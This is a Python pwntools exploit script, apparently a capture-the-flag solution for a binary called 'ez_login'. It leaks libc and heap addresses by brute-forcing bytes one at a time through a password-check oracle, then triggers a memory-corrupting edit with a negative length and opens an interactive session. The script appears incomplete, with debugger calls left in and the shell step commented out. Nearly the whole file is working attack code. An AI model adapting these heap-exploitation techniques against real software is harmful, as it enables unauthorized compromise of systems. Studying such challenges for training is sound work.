# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ez_login'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>>',num)

def add(idx , size , lenth=0 , text = 'a'):
    cmd(1)
    sla('index:' , idx)
    sla('size:' , size)
    sla('len:' , lenth)
    if (lenth == 0):
        return
    sa('password:' , text)

def edit(idx ,lenth, text):
    cmd(4)
    sla('index:' , idx)
    sla('len:' , lenth)
    sa('password:' , text)

def login(idx , pwd):
    cmd(2)
    sla('index:' , idx)
    sla('assword:' , pwd)

def delete(idx ):
    cmd(3)
    sla('index:' , idx)

def to_login(payload = '\x00'):
    for i in range(0x100):
        login(1 , payload + p8(i))
        data =  p.recvline()
        if ('success' in data):
            return i 

# one_gad = one_gadget(libc.path)

def attack():
    
    add(1 , 0x418 , 2 ,'aa')
    add(2 , 0x428)
    add(3 , 0x428)
    add(4 , 0x418)
    add(5 , 0x428)

    login(1 , 'aa')
    delete(1)

    targe = 0xe0
    add(1 , 0x418 , 2, '\n')
    targe += to_login() << 8
    delete(1)
    add(1 , 0x418 , 3, '\x00\n')
    targe += to_login('\x00\x00') << 16
    delete(1)
    add(1 , 0x418 , 4, '\x00\x00\n')
    targe += to_login('\x00\x00\x00') << 24
    delete(1)
    add(1 , 0x418 , 5, '\x00\x00\x00\n')
    targe += to_login('\x00\x00\x00\x00') << 32

    targe = targe + (0x7f<<40)
    libc.address = targe - 0x219ce0

    lg('libc.address',libc.address)

    targe = 0

    login(1, '\x00')
    delete(1)
    login(3, '\x00')
    delete(3)
    add(6 , 0x448)
    add(1 , 0x428 , 2 , '\n')
    targe += to_login() << 8

    delete(1)
    login(6, '\x00')
    delete(6)
    add(6 , 0x448)
    add(1 , 0x428 , 3 , '\x00\n')
    targe += to_login('\x00\x00') << 16

    delete(1)
    login(6, '\x00')
    delete(6)
    add(6 , 0x448)
    add(1 , 0x428 , 4 , '\x00\x00\n')
    targe += to_login('\x00\x00\x00') << 24

    delete(1)
    login(6, '\x00')
    delete(6)
    add(6 , 0x448)
    add(1 , 0x428 , 5 , '\x00\x00\x00\n')
    targe += to_login('\x00\x00\x00\x00') << 32

    heap_addr = (0x55 << 40) + targe
    lg('heap_addr',heap_addr)

    delete(1)
    login(6, '\x00')
    delete(6)
    add(6 , 0x448)
    add(1 , 0x428 , 8 , '\n')

    login(1 , p64(heap_addr))
    data =  p.recvline()
    if ('Wrong' in data):
        heap_addr += (0x1 << 40)
    
    lg('heap_addr' , heap_addr)


    add(3 , 0x418)
    login(1 , p64(heap_addr))
    edit(1 , -1 , 'a'*10)
    # delete(0)
    # edit(0 , 1 , '\x00')
    dbg()


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ez_login.py
@Time    :   2022/09/06 11:49:22
@Author  :   Niyah 
'''